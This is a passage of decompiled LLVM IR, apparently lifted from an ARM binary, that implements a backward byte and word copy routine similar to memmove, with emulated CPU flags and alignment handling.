  br i1 %v5_19b88, label %bb150, label %dec_label_pc_19b8c

dec_label_pc_19b8c:                               ; preds = %dec_label_pc_19b84
  %v6_19b8c = add i32 %v0_19b84, 4
  store i32 %v6_19b8c, i32* %r2.global-to-local, align 4
  %v8_19b8c = sub i32 -5, %v0_19b84
  %v9_19b8c = and i32 %v8_19b8c, %v2_19b84
  %v10_19b8c = icmp slt i32 %v9_19b8c, 0
  store i1 %v10_19b8c, i1* %cpsr_v.global-to-local, align 1
  %v11_19b8c = icmp slt i32 %v6_19b8c, 0
  store i1 %v11_19b8c, i1* %cpsr_n.global-to-local, align 1
  %v12_19b8c = icmp eq i32 %v2_19b84, 4
  store i1 %v12_19b8c, i1* %cpsr_z.global-to-local, align 1
  %v5_19b90 = icmp slt i32 %v2_19b84, 4
  %v6_19b90 = load i32, i32* %r1.global-to-local, align 4
  %v7_19b90 = add i32 %v6_19b90, -4
  %v8_19b90 = inttoptr i32 %v7_19b90 to i32*
  %v9_19b90 = load i32, i32* %v8_19b90, align 4
  store i32 %v9_19b90, i32* @r3, align 4
  br i1 %v5_19b90, label %.thread7, label %bb149

.thread7:                                         ; preds = %dec_label_pc_19b8c
  store i32 %v7_19b90, i32* %r1.global-to-local, align 4
  %v8_19b94 = add i32 %v7_19b94, -4
  %v9_19b94 = inttoptr i32 %v8_19b94 to i32*
  store i32 %v9_19b90, i32* %v9_19b94, align 4
  %v10_19b94 = load i32, i32* %r0.global-to-local, align 4
  %v11_19b94 = add i32 %v10_19b94, -4
  store i32 %v11_19b94, i32* %r0.global-to-local, align 4
  %v0_19ba4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_19b8c
  %v10_19b98 = add i32 %v6_19b90, -8
  %v11_19b98 = inttoptr i32 %v10_19b98 to i32*
  %v12_19b98 = load i32, i32* %v11_19b98, align 4
  store i32 %v12_19b98, i32* @ip, align 4
  store i32 %v10_19b98, i32* %r1.global-to-local, align 4
  %v7_19b9c = add i32 %v7_19b94, -8
  %v8_19b9c = inttoptr i32 %v7_19b9c to i32*
  store i32 %v9_19b90, i32* %v8_19b9c, align 4
  %v10_19b9c = add i32 %v7_19b94, -4
  %v11_19b9c = inttoptr i32 %v10_19b9c to i32*
  %v12_19b9c = load i32, i32* @ip, align 4
  store i32 %v12_19b9c, i32* %v11_19b9c, align 4
  store i32 %v7_19b9c, i32* %r0.global-to-local, align 4
  %v6_19ba0 = load i32, i32* %r2.global-to-local, align 4
  %v7_19ba0 = add i32 %v6_19ba0, -4
  store i32 %v7_19ba0, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread7, %dec_label_pc_19b84, %dec_label_pc_19b14, %.thread13, %dec_label_pc_19d48, %dec_label_pc_19cdc, %dec_label_pc_19c70, %bb149
  %v2_19ba8 = phi i32 [ %v11_19b94, %.thread7 ], [ %v7_19b94, %dec_label_pc_19b84 ], [ %v2_19b18, %dec_label_pc_19b14 ], [ %v0_19c4019, %.thread13 ], [ %v2_19bb452, %dec_label_pc_19d48 ], [ %v2_19bb451, %dec_label_pc_19cdc ], [ %v2_19bb450, %dec_label_pc_19c70 ], [ %v7_19b9c, %bb149 ]
  %v0_19ba4 = phi i32 [ %v0_19ba4.pre, %.thread7 ], [ %v2_19b84, %dec_label_pc_19b84 ], [ %v2_19b1c, %dec_label_pc_19b14 ], [ %v2_19be8, %.thread13 ], [ %v0_19ba448, %dec_label_pc_19d48 ], [ %v0_19ba447, %dec_label_pc_19cdc ], [ %v0_19ba446, %dec_label_pc_19c70 ], [ %v7_19ba0, %bb149 ]
  %v1_19ba4 = add i32 %v0_19ba4, 4
  store i32 %v1_19ba4, i32* @r2, align 4
  %v3_19ba4 = sub i32 0, %v0_19ba4
  %v4_19ba4 = and i32 %v1_19ba4, %v3_19ba4
  %v5_19ba4 = icmp slt i32 %v4_19ba4, 0
  store i1 %v5_19ba4, i1* %cpsr_v.global-to-local, align 1
  %v6_19ba4 = icmp slt i32 %v1_19ba4, 0
  store i1 %v6_19ba4, i1* %cpsr_n.global-to-local, align 1
  %v7_19ba4 = icmp eq i32 %v1_19ba4, 0
  store i1 %v7_19ba4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19ba4, label %.thread129, label %bb151

bb151:                                            ; preds = %bb150
  %v1_19bac = add i32 %v0_19ba4, 2
  %v3_19bac = sub i32 -3, %v0_19ba4
  %v4_19bac = and i32 %v3_19bac, %v1_19ba4
  %v5_19bac = icmp slt i32 %v4_19bac, 0
  store i1 %v5_19bac, i1* %cpsr_v.global-to-local, align 1
  %v6_19bac = icmp slt i32 %v1_19bac, 0
  store i1 %v6_19bac, i1* %cpsr_n.global-to-local, align 1
  %v7_19bac = icmp eq i32 %v1_19ba4, 2
  store i1 %v7_19bac, i1* %cpsr_z.global-to-local, align 1
  %v0_19bb0 = load i32, i32* %r1.global-to-local, align 4
  %v1_19bb0 = add i32 %v0_19bb0, -1
  %v2_19bb0 = inttoptr i32 %v1_19bb0 to i8*
  %v3_19bb0 = load i8, i8* %v2_19bb0, align 1
  %v4_19bb0 = zext i8 %v3_19bb0 to i32
  store i32 %v4_19bb0, i32* @r3, align 4
  store i32 %v1_19bb0, i32* %r1.global-to-local, align 4
  %v3_19bb4 = add i32 %v2_19ba8, -1
  %v4_19bb4 = inttoptr i32 %v3_19bb4 to i8*
  store i8 %v3_19bb0, i8* %v4_19bb4, align 1
  %v5_19bb4 = load i32, i32* %r0.global-to-local, align 4
  %v6_19bb4 = add i32 %v5_19bb4, -1
  store i32 %v6_19bb4, i32* %r0.global-to-local, align 4
  %v0_19bb8 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_19bb8 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_19bb8 = xor i1 %v0_19bb8, %v1_19bb8
  br i1 %v2_19bb8, label %.thread128, label %bb152

bb152:                                            ; preds = %bb151
  %v3_19bb8 = load i32, i32* %r1.global-to-local, align 4
  %v4_19bb8 = add i32 %v3_19bb8, -1
  %v5_19bb8 = inttoptr i32 %v4_19bb8 to i8*
  %v6_19bb8 = load i8, i8* %v5_19bb8, align 1
  %v7_19bb8 = zext i8 %v6_19bb8 to i32
  store i32 %v7_19bb8, i32* @r3, align 4
  store i32 %v4_19bb8, i32* %r1.global-to-local, align 4
  %v6_19bbc = add i32 %v5_19bb4, -2
  %v7_19bbc = inttoptr i32 %v6_19bbc to i8*
  store i8 %v6_19bb8, i8* %v7_19bbc, align 1
  %v8_19bbc = load i32, i32* %r0.global-to-local, align 4
  %v9_19bbc = add i32 %v8_19bbc, -1
  store i32 %v9_19bbc, i32* %r0.global-to-local, align 4
  %v1_19bc0.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_19bc0.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread128

.thread128:                                       ; preds = %bb151, %bb152
  %v7_19bc4 = phi i32 [ %v9_19bbc, %bb152 ], [ %v6_19bb4, %bb151 ]
  %v2_19bc4 = phi i1 [ %v2_19bc0.pre, %bb152 ], [ %v1_19bb8, %bb151 ]
  %v1_19bc4 = phi i1 [ %v1_19bc0.pre, %bb152 ], [ %v0_19bb8, %bb151 ]
  %v0_19bc0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_19bc0 = xor i1 %v2_19bc4, %v1_19bc4
  %v4_19bc0 = or i1 %v0_19bc0, %v3_19bc0
  br i1 %v4_19bc0, label %.thread129, label %bb153

bb153:                                            ; preds = %.thread128
  %v5_19bc0 = load i32, i32* %r1.global-to-local, align 4
  %v6_19bc0 = add i32 %v5_19bc0, -1
  %v7_19bc0 = inttoptr i32 %v6_19bc0 to i8*
  %v8_19bc0 = load i8, i8* %v7_19bc0, align 1
  %v9_19bc0 = zext i8 %v8_19bc0 to i32
  store i32 %v9_19bc0, i32* @r3, align 4
  store i32 %v6_19bc0, i32* %r1.global-to-local, align 4
  %v8_19bc4 = add i32 %v7_19bc4, -1
  %v9_19bc4 = inttoptr i32 %v8_19bc4 to i8*
  store i8 %v8_19bc0, i8* %v9_19bc4, align 1
  %v10_19bc4 = load i32, i32* %r0.global-to-local, align 4
  %v11_19bc4 = add i32 %v10_19bc4, -1
  store i32 %v11_19bc4, i32* %r0.global-to-local, align 4
  br label %.thread129

dec_label_pc_19bcc:                               ; preds = %dec_label_pc_19b24
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_19bcc = icmp eq i32 %v1_19b24, 1
  store i1 %v8_19bcc, i1* %cpsr_n.global-to-local, align 1
  %v9_19bcc = icmp eq i32 %v1_19b24, 2
  store i1 %v9_19bcc, i1* %cpsr_z.global-to-local, align 1
  %v1_19bd0 = add i32 %v2_19b14, -1
  %v2_19bd0 = inttoptr i32 %v1_19bd0 to i8*
  %v3_19bd0 = load i8, i8* %v2_19bd0, align 1
  %v4_19bd0 = zext i8 %v3_19bd0 to i32
  store i32 %v4_19bd0, i32* @r3, align 4
  store i32 %v1_19bd0, i32* %r1.global-to-local, align 4
  %v3_19bd4 = add i32 %v2_19b18, -1
  %v4_19bd4 = inttoptr i32 %v3_19bd4 to i8*
  store i8 %v3_19bd0, i8* %v4_19bd4, align 1
  %v5_19bd4 = load i32, i32* %r0.global-to-local, align 4
  %v6_19bd4 = add i32 %v5_19bd4, -1
  store i32 %v6_19bd4, i32* %r0.global-to-local, align 4
  br i1 %v8_19bcc, label %.thread13, label %bb154

bb154:                                            ; preds = %dec_label_pc_19bcc
  %v6_19bd8 = load i32, i32* %r1.global-to-local, align 4
  %v7_19bd8 = add i32 %v6_19bd8, -1
  %v8_19bd8 = inttoptr i32 %v7_19bd8 to i8*
  %v9_19bd8 = load i8, i8* %v8_19bd8, align 1
  %v10_19bd8 = zext i8 %v9_19bd8 to i32
  store i32 %v10_19bd8, i32* @r3, align 4
  store i32 %v7_19bd8, i32* %r1.global-to-local, align 4
  %v9_19bdc = add i32 %v5_19bd4, -2
  %v10_19bdc = inttoptr i32 %v9_19bdc to i8*
  store i8 %v9_19bd8, i8* %v10_19bdc, align 1
  %v11_19bdc = load i32, i32* %r0.global-to-local, align 4
  %v12_19bdc = add i32 %v11_19bdc, -1
  store i32 %v12_19bdc, i32* %r0.global-to-local, align 4
  br i1 %v9_19bcc, label %.thread13, label %bb155

bb155:                                            ; preds = %bb154
  %v8_19be0 = load i32, i32* %r1.global-to-local, align 4
  %v9_19be0 = add i32 %v8_19be0, -1
  %v10_19be0 = inttoptr i32 %v9_19be0 to i8*
  %v11_19be0 = load i8, i8* %v10_19be0, align 1
  %v12_19be0 = zext i8 %v11_19be0 to i32
  store i32 %v12_19be0, i32* @r3, align 4
  store i32 %v9_19be0, i32* %r1.global-to-local, align 4
  %v11_19be4 = add i32 %v11_19bdc, -2
  %v12_19be4 = inttoptr i32 %v11_19be4 to i8*
  store i8 %v11_19be0, i8* %v12_19be4, align 1
  %v13_19be4 = load i32, i32* %r0.global-to-local, align 4
  %v14_19be4 = add i32 %v13_19be4, -1
  store i32 %v14_19be4, i32* %r0.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %bb154, %dec_label_pc_19bcc, %bb155
  %v0_19c4019 = phi i32 [ %v12_19bdc, %bb154 ], [ %v6_19bd4, %dec_label_pc_19bcc ], [ %v14_19be4, %bb155 ]
  %v0_19be8 = load i32, i32* %r2.global-to-local, align 4
  %v1_19be8 = load i32, i32* @ip, align 4
  %v2_19be8 = sub i32 %v0_19be8, %v1_19be8
  store i32 %v2_19be8, i32* %r2.global-to-local, align 4
  %v4_19be8 = xor i32 %v1_19be8, %v0_19be8
  %v5_19be8 = xor i32 %v2_19be8, %v0_19be8
  %v6_19be8 = and i32 %v5_19be8, %v4_19be8
  %v7_19be8 = icmp slt i32 %v6_19be8, 0
  store i1 %v7_19be8, i1* %cpsr_v.global-to-local, align 1
  %v8_19be8 = icmp slt i32 %v2_19be8, 0
  store i1 %v8_19be8, i1* %cpsr_n.global-to-local, align 1
  %v9_19be8 = icmp eq i32 %v0_19be8, %v1_19be8
  store i1 %v9_19be8, i1* %cpsr_z.global-to-local, align 1
  %v5_19bec = icmp slt i32 %v0_19be8, %v1_19be8
  br i1 %v5_19bec, label %bb150, label %dec_label_pc_19bf0

dec_label_pc_19bf0:                               ; preds = %.thread13
  %v0_19bf0 = load i32, i32* %r1.global-to-local, align 4
  %v1_19bf0 = urem i32 %v0_19bf0, 4
  store i32 %v1_19bf0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_19bf0 = icmp eq i32 %v1_19bf0, 0
  store i1 %v2_19bf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19bf0, label %dec_label_pc_19b34, label %dec_label_pc_19bf8

dec_label_pc_19bf8:                               ; preds = %dec_label_pc_19b2c, %dec_label_pc_19bf0
  %v0_19c4018 = phi i32 [ %v2_19b18, %dec_label_pc_19b2c ], [ %v0_19c4019, %dec_label_pc_19bf0 ]
  %v0_19cec = phi i32 [ %v2_19b1c, %dec_label_pc_19b2c ], [ %v2_19be8, %dec_label_pc_19bf0 ]
  %v0_19bf8 = phi i32 [ %v2_19b14, %dec_label_pc_19b2c ], [ %v0_19bf0, %dec_label_pc_19bf0 ]
  %v0_19c00 = phi i32 [ %v1_19b2c, %dec_label_pc_19b2c ], [ %v1_19bf0, %dec_label_pc_19bf0 ]
  %v1_19bf8 = and i32 %v0_19bf8, -4
  store i32 %v1_19bf8, i32* %r1.global-to-local, align 4
  %v1_19bfc = inttoptr i32 %v1_19bf8 to i32*
  %v2_19bfc = load i32, i32* %v1_19bfc, align 4
  store i32 %v2_19bfc, i32* @r3, align 4
  %v7_19c00 = icmp ult i32 %v0_19c00, 2
  %v2_19ce4 = add i32 %v0_19cec, -12
  %v4_19ce4 = sub i32 11, %v0_19cec
  %v5_19ce4 = and i32 %v4_19ce4, %v0_19cec
  %v6_19ce4 = icmp slt i32 %v5_19ce4, 0
  store i1 %v6_19ce4, i1* %cpsr_v.global-to-local, align 1
  %v7_19ce4 = icmp slt i32 %v2_19ce4, 0
  store i1 %v7_19ce4, i1* %cpsr_n.global-to-local, align 1
  %v8_19ce4 = icmp eq i32 %v0_19cec, 12
  store i1 %v8_19ce4, i1* %cpsr_z.global-to-local, align 1
  %v5_19ce8 = icmp slt i32 %v0_19cec, 12
  br i1 %v7_19c00, label %dec_label_pc_19ce4, label %dec_label_pc_19c08

dec_label_pc_19c08:                               ; preds = %dec_label_pc_19bf8
  %v8_19c00 = icmp eq i32 %v0_19c00, 2
  br i1 %v8_19c00, label %dec_label_pc_19c78, label %dec_label_pc_19c0c

dec_label_pc_19c0c:                               ; preds = %dec_label_pc_19c08
  br i1 %v5_19ce8, label %dec_label_pc_19c58, label %dec_label_pc_19c14

dec_label_pc_19c14:                               ; preds = %dec_label_pc_19c0c
  store i32 %v2_19ce4, i32* %r2.global-to-local, align 4
  %v3_19c18 = load i32, i32* @r4, align 4
  store i32 %v3_19c18, i32* %stack_var_-12, align 4
  %v6_19c18 = load i32, i32* @r5, align 4
  %v8_19c18 = inttoptr i32 %v6_19c18 to i8*
  store i8* %v8_19c18, i8** %stack_var_-8, align 4
  %v11_19c18 = load i32, i32* @lr, align 4
  br label %dec_label_pc_19c1c

dec_label_pc_19c1c:                               ; preds = %dec_label_pc_19c1c.dec_label_pc_19c1c_crit_edge, %dec_label_pc_19c14
  %v0_19c40 = phi i32 [ %v1_19c40, %dec_label_pc_19c1c.dec_label_pc_19c1c_crit_edge ], [ %v0_19c4018, %dec_label_pc_19c14 ]
  %v0_19c20 = phi i32 [ %v0_19c20.pre, %dec_label_pc_19c1c.dec_label_pc_19c1c_crit_edge ], [ %v1_19bf8, %dec_label_pc_19c14 ]
  %v0_19c1c = phi i32 [ %v0_19c1c.pre, %dec_label_pc_19c1c.dec_label_pc_19c1c_crit_edge ], [ %v2_19bfc, %dec_label_pc_19c14 ]
  %v3_19c1c = mul i32 %v0_19c1c, 256
  store i32 %v3_19c1c, i32* %lr.global-to-local, align 4
  %v1_19c20 = add i32 %v0_19c20, -4
  %v2_19c20 = inttoptr i32 %v1_19c20 to i32*
  %v3_19c20 = load i32, i32* %v2_19c20, align 4
  store i32 %v3_19c20, i32* @r3, align 4
  %v4_19c20 = add i32 %v0_19c20, -8
  %v5_19c20 = inttoptr i32 %v4_19c20 to i32*
  %v6_19c20 = load i32, i32* %v5_19c20, align 4
  store i32 %v6_19c20, i32* %r4.global-to-local, align 4
  %v7_19c20 = add i32 %v0_19c20, -12
  %v8_19c20 = inttoptr i32 %v7_19c20 to i32*
  %v9_19c20 = load i32, i32* %v8_19c20, align 4
  store i32 %v9_19c20, i32* %r5.global-to-local, align 4
  %v10_19c20 = add i32 %v0_19c20, -16
  %v11_19c20 = inttoptr i32 %v10_19c20 to i32*
  %v12_19c20 = load i32, i32* %v11_19c20, align 4
  store i32 %v10_19c20, i32* %r1.global-to-local, align 4
  %v4_19c24 = udiv i32 %v12_19c20, 16777216
  %v5_19c24 = or i32 %v4_19c24, %v3_19c1c
  store i32 %v5_19c24, i32* %lr.global-to-local, align 4
  %v3_19c28 = mul i32 %v12_19c20, 256
  %v4_19c2c = udiv i32 %v9_19c20, 16777216
  %v5_19c2c = or i32 %v3_19c28, %v4_19c2c
  store i32 %v5_19c2c, i32* @ip, align 4
  %v3_19c30 = mul i32 %v9_19c20, 256
  %v4_19c34 = udiv i32 %v6_19c20, 16777216
  %v5_19c34 = or i32 %v3_19c30, %v4_19c34
  store i32 %v5_19c34, i32* %r5.global-to-local, align 4
  %v3_19c38 = mul i32 %v6_19c20, 256
  %v4_19c3c = udiv i32 %v3_19c20, 16777216
  %v5_19c3c = or i32 %v3_19c38, %v4_19c3c
  store i32 %v5_19c3c, i32* %r4.global-to-local, align 4
  %v1_19c40 = add i32 %v0_19c40, -16
  %v2_19c40 = inttoptr i32 %v1_19c40 to i32*
  store i32 %v5_19c3c, i32* %v2_19c40, align 4
  %v4_19c40 = add i32 %v0_19c40, -12
  %v5_19c40 = inttoptr i32 %v4_19c40 to i32*
  %v6_19c40 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_19c40, i32* %v5_19c40, align 4
  %v7_19c40 = add i32 %v0_19c40, -8
  %v8_19c40 = inttoptr i32 %v7_19c40 to i32*
  %v9_19c40 = load i32, i32* @ip, align 4
  store i32 %v9_19c40, i32* %v8_19c40, align 4
  %v10_19c40 = add i32 %v0_19c40, -4
  %v11_19c40 = inttoptr i32 %v10_19c40 to i32*
  %v12_19c40 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_19c40, i32* %v11_19c40, align 4
  store i32 %v1_19c40, i32* %r0.global-to-local, align 4
  %v0_19c44 = load i32, i32* %r2.global-to-local, align 4
  %v2_19c44 = add i32 %v0_19c44, -16
  store i32 %v2_19c44, i32* %r2.global-to-local, align 4
  %v6_19c48 = icmp slt i32 %v0_19c44, 16
  br i1 %v6_19c48, label %dec_label_pc_19c4c, label %dec_label_pc_19c1c.dec_label_pc_19c1c_crit_edge

dec_label_pc_19c1c.dec_label_pc_19c1c_crit_edge:  ; preds = %dec_label_pc_19c1c
  %v0_19c1c.pre = load i32, i32* @r3, align 4
  %v0_19c20.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19c1c

dec_label_pc_19c4c:                               ; preds = %dec_label_pc_19c1c
  %v2_19c4c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19c4c, i32* @r4, align 4
  %v5_19c4c = load i8*, i8** %stack_var_-8, align 4
  %v6_19c4c = ptrtoint i8* %v5_19c4c to i32
  store i32 %v6_19c4c, i32* @r5, align 4
  store i32 %v11_19c18, i32* @lr, align 4
  %v2_19c50 = add i32 %v0_19c44, -4
  store i32 %v2_19c50, i32* %r2.global-to-local, align 4
  %v4_19c50 = add i32 %v0_19c44, 2147483632
  %v5_19c50 = and i32 %v2_19c50, %v4_19c50
  %v6_19c50 = icmp slt i32 %v5_19c50, 0
  store i1 %v6_19c50, i1* %cpsr_v.global-to-local, align 1
  %v7_19c50 = icmp slt i32 %v2_19c50, 0
  store i1 %v7_19c50, i1* %cpsr_n.global-to-local, align 1
  %v8_19c50 = icmp eq i32 %v2_19c50, 0
  store i1 %v8_19c50, i1* %cpsr_z.global-to-local, align 1
  %v5_19c54 = icmp slt i32 %v2_19c44, -12
  br i1 %v5_19c54, label %dec_label_pc_19c70, label %dec_label_pc_19c58

dec_label_pc_19c58:                               ; preds = %dec_label_pc_19c4c, %dec_label_pc_19c0c, %dec_label_pc_19c58
  %v1_19c64 = phi i32 [ %v5_19c64, %dec_label_pc_19c58 ], [ %v1_19c40, %dec_label_pc_19c4c ], [ %v0_19c4018, %dec_label_pc_19c0c ]
  %v0_19c58 = load i32, i32* @r3, align 4
  %v3_19c58 = mul i32 %v0_19c58, 256
  store i32 %v3_19c58, i32* %ip.global-to-local, align 4
  %v0_19c5c = load i32, i32* %r1.global-to-local, align 4
  %v1_19c5c = add i32 %v0_19c5c, -4
  %v2_19c5c = inttoptr i32 %v1_19c5c to i32*
  %v3_19c5c = load i32, i32* %v2_19c5c, align 4
  store i32 %v3_19c5c, i32* @r3, align 4
  store i32 %v1_19c5c, i32* %r1.global-to-local, align 4
  %v4_19c60 = udiv i32 %v3_19c5c, 16777216
  %v5_19c60 = or i32 %v4_19c60, %v3_19c58
  store i32 %v5_19c60, i32* @ip, align 4
  %v2_19c64 = add i32 %v1_19c64, -4
  %v3_19c64 = inttoptr i32 %v2_19c64 to i32*
  store i32 %v5_19c60, i32* %v3_19c64, align 4
  %v4_19c64 = load i32, i32* %r0.global-to-local, align 4
  %v5_19c64 = add i32 %v4_19c64, -4
  store i32 %v5_19c64, i32* %r0.global-to-local, align 4
  %v0_19c68 = load i32, i32* %r2.global-to-local, align 4
  %v2_19c68 = add i32 %v0_19c68, -4
  store i32 %v2_19c68, i32* %r2.global-to-local, align 4
  %v6_19c6c = icmp slt i32 %v0_19c68, 4
  br i1 %v6_19c6c, label %dec_label_pc_19c70.loopexit, label %dec_label_pc_19c58

dec_label_pc_19c70.loopexit:                      ; preds = %dec_label_pc_19c58
  %v4_19c68 = sub i32 3, %v0_19c68
  %v5_19c68 = and i32 %v4_19c68, %v0_19c68
  %v6_19c68 = icmp slt i32 %v5_19c68, 0
  %v7_19c68 = icmp slt i32 %v2_19c68, 0
  store i1 %v6_19c68, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_19c68, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_19c70

dec_label_pc_19c70:                               ; preds = %dec_label_pc_19c70.loopexit, %dec_label_pc_19c4c
  %v2_19bb450 = phi i32 [ %v5_19c64, %dec_label_pc_19c70.loopexit ], [ %v1_19c40, %dec_label_pc_19c4c ]
  %v0_19ba446 = phi i32 [ %v2_19c68, %dec_label_pc_19c70.loopexit ], [ %v2_19c50, %dec_label_pc_19c4c ]
  %v0_19c70 = load i32, i32* %r1.global-to-local, align 4
  %v1_19c70 = add i32 %v0_19c70, 3
  store i32 %v1_19c70, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_19c78:                               ; preds = %dec_label_pc_19c08
  br i1 %v5_19ce8, label %dec_label_pc_19cc4, label %dec_label_pc_19c80

dec_label_pc_19c80:                               ; preds = %dec_label_pc_19c78
  store i32 %v2_19ce4, i32* %r2.global-to-local, align 4
  %v3_19c84 = load i32, i32* @r4, align 4
  store i32 %v3_19c84, i32* %stack_var_-12, align 4
  %v6_19c84 = load i32, i32* @r5, align 4
  %v8_19c84 = inttoptr i32 %v6_19c84 to i8*
  store i8* %v8_19c84, i8** %stack_var_-8, align 4
  %v11_19c84 = load i32, i32* @lr, align 4
  br label %dec_label_pc_19c88

dec_label_pc_19c88:                               ; preds = %dec_label_pc_19c88.dec_label_pc_19c88_crit_edge, %dec_label_pc_19c80
  %v0_19cac = phi i32 [ %v1_19cac, %dec_label_pc_19c88.dec_label_pc_19c88_crit_edge ], [ %v0_19c4018, %dec_label_pc_19c80 ]
  %v0_19c8c = phi i32 [ %v0_19c8c.pre, %dec_label_pc_19c88.dec_label_pc_19c88_crit_edge ], [ %v1_19bf8, %dec_label_pc_19c80 ]
  %v0_19c88 = phi i32 [ %v0_19c88.pre, %dec_label_pc_19c88.dec_label_pc_19c88_crit_edge ], [ %v2_19bfc, %dec_label_pc_19c80 ]
  %v3_19c88 = mul i32 %v0_19c88, 65536
  store i32 %v3_19c88, i32* %lr.global-to-local, align 4
  %v1_19c8c = add i32 %v0_19c8c, -4
  %v2_19c8c = inttoptr i32 %v1_19c8c to i32*
  %v3_19c8c = load i32, i32* %v2_19c8c, align 4
  store i32 %v3_19c8c, i32* @r3, align 4
  %v4_19c8c = add i32 %v0_19c8c, -8
  %v5_19c8c = inttoptr i32 %v4_19c8c to i32*
  %v6_19c8c = load i32, i32* %v5_19c8c, align 4
  store i32 %v6_19c8c, i32* %r4.global-to-local, align 4
  %v7_19c8c = add i32 %v0_19c8c, -12
  %v8_19c8c = inttoptr i32 %v7_19c8c to i32*
  %v9_19c8c = load i32, i32* %v8_19c8c, align 4
  store i32 %v9_19c8c, i32* %r5.global-to-local, align 4
  %v10_19c8c = add i32 %v0_19c8c, -16
  %v11_19c8c = inttoptr i32 %v10_19c8c to i32*
  %v12_19c8c = load i32, i32* %v11_19c8c, align 4
  store i32 %v10_19c8c, i32* %r1.global-to-local, align 4
  %v4_19c90 = udiv i32 %v12_19c8c, 65536
  %v5_19c90 = or i32 %v4_19c90, %v3_19c88
  store i32 %v5_19c90, i32* %lr.global-to-local, align 4
  %v3_19c94 = mul i32 %v12_19c8c, 65536
  %v4_19c98 = udiv i32 %v9_19c8c, 65536
  %v5_19c98 = or i32 %v3_19c94, %v4_19c98
  store i32 %v5_19c98, i32* @ip, align 4
  %v3_19c9c = mul i32 %v9_19c8c, 65536
  %v4_19ca0 = udiv i32 %v6_19c8c, 65536
  %v5_19ca0 = or i32 %v3_19c9c, %v4_19ca0
  store i32 %v5_19ca0, i32* %r5.global-to-local, align 4
  %v3_19ca4 = mul i32 %v6_19c8c, 65536
  %v4_19ca8 = udiv i32 %v3_19c8c, 65536
  %v5_19ca8 = or i32 %v3_19ca4, %v4_19ca8
  store i32 %v5_19ca8, i32* %r4.global-to-local, align 4
  %v1_19cac = add i32 %v0_19cac, -16
  %v2_19cac = inttoptr i32 %v1_19cac to i32*
  store i32 %v5_19ca8, i32* %v2_19cac, align 4
  %v4_19cac = add i32 %v0_19cac, -12
  %v5_19cac = inttoptr i32 %v4_19cac to i32*
  %v6_19cac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_19cac, i32* %v5_19cac, align 4
  %v7_19cac = add i32 %v0_19cac, -8
  %v8_19cac = inttoptr i32 %v7_19cac to i32*
  %v9_19cac = load i32, i32* @ip, align 4
  store i32 %v9_19cac, i32* %v8_19cac, align 4
  %v10_19cac = add i32 %v0_19cac, -4
  %v11_19cac = inttoptr i32 %v10_19cac to i32*
  %v12_19cac = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_19cac, i32* %v11_19cac, align 4
  store i32 %v1_19cac, i32* %r0.global-to-local, align 4
  %v0_19cb0 = load i32, i32* %r2.global-to-local, align 4
  %v2_19cb0 = add i32 %v0_19cb0, -16
  store i32 %v2_19cb0, i32* %r2.global-to-local, align 4
  %v6_19cb4 = icmp slt i32 %v0_19cb0, 16
  br i1 %v6_19cb4, label %dec_label_pc_19cb8, label %dec_label_pc_19c88.dec_label_pc_19c88_crit_edge

dec_label_pc_19c88.dec_label_pc_19c88_crit_edge:  ; preds = %dec_label_pc_19c88
  %v0_19c88.pre = load i32, i32* @r3, align 4
  %v0_19c8c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19c88

dec_label_pc_19cb8:                               ; preds = %dec_label_pc_19c88
  %v2_19cb8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19cb8, i32* @r4, align 4
  %v5_19cb8 = load i8*, i8** %stack_var_-8, align 4
  %v6_19cb8 = ptrtoint i8* %v5_19cb8 to i32
  store i32 %v6_19cb8, i32* @r5, align 4
  store i32 %v11_19c84, i32* @lr, align 4
  %v2_19cbc = add i32 %v0_19cb0, -4
  store i32 %v2_19cbc, i32* %r2.global-to-local, align 4
  %v4_19cbc = add i32 %v0_19cb0, 2147483632
  %v5_19cbc = and i32 %v2_19cbc, %v4_19cbc
  %v6_19cbc = icmp slt i32 %v5_19cbc, 0
  store i1 %v6_19cbc, i1* %cpsr_v.global-to-local, align 1
  %v7_19cbc = icmp slt i32 %v2_19cbc, 0
  store i1 %v7_19cbc, i1* %cpsr_n.global-to-local, align 1
  %v8_19cbc = icmp eq i32 %v2_19cbc, 0
  store i1 %v8_19cbc, i1* %cpsr_z.global-to-local, align 1
  %v5_19cc0 = icmp slt i32 %v2_19cb0, -12
  br i1 %v5_19cc0, label %dec_label_pc_19cdc, label %dec_label_pc_19cc4

dec_label_pc_19cc4:                               ; preds = %dec_label_pc_19cb8, %dec_label_pc_19c78, %dec_label_pc_19cc4
  %v1_19cd0 = phi i32 [ %v5_19cd0, %dec_label_pc_19cc4 ], [ %v1_19cac, %dec_label_pc_19cb8 ], [ %v0_19c4018, %dec_label_pc_19c78 ]
  %v0_19cc4 = load i32, i32* @r3, align 4
  %v3_19cc4 = mul i32 %v0_19cc4, 65536
  store i32 %v3_19cc4, i32* %ip.global-to-local, align 4
  %v0_19cc8 = load i32, i32* %r1.global-to-local, align 4
  %v1_19cc8 = add i32 %v0_19cc8, -4
  %v2_19cc8 = inttoptr i32 %v1_19cc8 to i32*
  %v3_19cc8 = load i32, i32* %v2_19cc8, align 4
